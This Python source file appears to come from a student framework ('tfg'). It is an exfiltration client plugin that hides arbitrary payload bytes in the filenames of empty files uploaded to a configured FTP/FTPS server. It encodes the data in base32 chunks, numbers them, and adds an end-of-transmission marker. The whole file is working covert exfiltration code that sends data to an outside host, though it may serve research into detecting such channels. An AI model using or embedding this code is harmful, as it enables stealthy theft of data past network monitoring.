from __future__ import annotations
from typing import Dict, Any, Iterable
from ftplib import FTP, FTP_TLS, error_perm
import io, base64

from tfg.plugins.api import ExfilClientPlugin

MAX_NAME = 200  # conservative for many FTP servers
RAW_SLICE = 30  # raw bytes per filename token before base32


def b32(s: bytes) -> str:
    return base64.b32encode(s).decode("ascii").strip("=").lower()


def _connect_ftp(config: Dict[str, Any]) -> FTP:
    host = config["host"]
    port = int(config.get("port", 21))
    user = config.get("user") or "anonymous"
    password = config.get("password") or "anonymous@"

    ftp = FTP()
    ftp.connect(host, port, timeout=30)
    try:
        ftp.login(user=user, passwd=password)
        return ftp
    except error_perm as e:
        msg = str(e).lower()
        ftp.close()
        if "auth" not in msg:
            raise

    ftps = FTP_TLS()
    ftps.connect(host, port, timeout=30)
    ftps.auth()
    ftps.login(user=user, passwd=password)
    ftps.prot_p()
    return ftps


class FtpClientNames(ExfilClientPlugin):
    canal = "FTP"
    metodo = 2
    name = "ftp_client_names"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        root = config.get("root") or "/"
        exfil_id = config.get("exfil_id") or "tfg"

        ftp = _connect_ftp(config)
        if root and root != "/":
            try:
                ftp.cwd(root)
            except Exception:
                ftp.mkd(root)
                ftp.cwd(root)

        seq = 0
        total = 0
        buf = bytearray()
        for chunk in payload_iter:
            buf += chunk
            while len(buf) >= RAW_SLICE:
                part = bytes(buf[:RAW_SLICE])
                del buf[:RAW_SLICE]
                token = b32(part)
                # file is EMPTY; info va en el nombre
                name = f"{exfil_id}.{seq:06d}.{token}"
                ftp.storbinary(f"STOR {name}", io.BytesIO(b""))
                total += len(part)
                seq += 1
        if buf:
            token = b32(bytes(buf))
            name = f"{exfil_id}.{seq:06d}.{token}"
            ftp.storbinary(f"STOR {name}", io.BytesIO(b""))
            total += len(buf)
            seq += 1

        # EOT para señal explícita (opcional)
        ftp.storbinary(f"STOR {exfil_id}.EOT", io.BytesIO(b""))
        ftp.quit()
        return {"ok": True, "files": seq, "bytes": total}
